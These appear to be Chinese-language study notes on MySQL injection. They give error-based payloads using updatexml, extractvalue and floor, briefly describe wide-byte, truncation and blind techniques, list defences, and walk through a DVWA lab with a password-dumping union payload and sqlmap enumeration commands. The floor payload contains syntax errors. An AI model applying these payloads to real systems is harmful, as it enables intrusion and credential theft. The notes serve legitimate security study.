mysql注入方式
    1)union方式
    2)mysql显错
        1 通过updatexml函数：select * from message where id=1 and updatexml(1, (concat(0x7c, (select @@version))), 1);#XPATH syntax error：‘|5.1.50-community-log’
        2 通过extractvalue：select * from message where id=1 and extractvalue(1, concat(0x7c, (select user())));#XPATH syntax error：‘|root@localhost’
        3 通过floor函数：select * from message where id=1 union select * from (select count(*), concat(floor(rand(0)*2),select user()) a from information_schema.tablesgroup by a)b#Duplicate entry '1root@localhost' for key 'group_key'

    3)宽字节注入
        '   %d5
    4)MySql长字符截断
        sql_mode = default ，即STRICT_ALL_TABLES未开启 即有机会导致截断注入
    5) 延时注入(盲注)

防御手段：
        1 严格的数据类型：java C#等强类型语言几乎完全忽略数字行注入
                防御数字型注入：进行数字类型判断，非数字，自动抛出错误
        2 特殊自负转义
                OWASP ESAPI 自负转义接口
        3 使用预编译语句

DVWA 
  sql injection
      low: 1' union select password, null from users;-- &Submit=Submit
      测试流程
            sqlmap -u "http://192.168.2.105/DVWA-1.9/vulnerabilities/sqli/?id=aaaaaaaa&Submit=Submit#" -p 'id' --cookie="security=low; PHPSESSID=6h7svkbduj1vpr631rmqqt7k87" -v 1
            sqlmap -u "http://192.168.2.105/DVWA-1.9/vulnerabilities/sqli/?id=aaaaaaaa&Submit=Submit#" -p 'id' --cookie="security=low; PHPSESSID=6h7svkbduj1vpr631rmqqt7k87" -v 1 --dbs
            sqlmap -u "http://192.168.2.105/DVWA-1.9/vulnerabilities/sqli/?id=aaaaaaaa&Submit=Submit#" -p 'id' --cookie="security=low; PHPSESSID=6h7svkbduj1vpr631rmqqt7k87" -v 1 --current-db
            sqlmap -u "http://192.168.2.105/DVWA-1.9/vulnerabilities/sqli/?id=aaaaaaaa&Submit=Submit#" -p 'id' --cookie="security=low; PHPSESSID=6h7svkbduj1vpr631rmqqt7k87" -v 1 --table -D "dvwa"
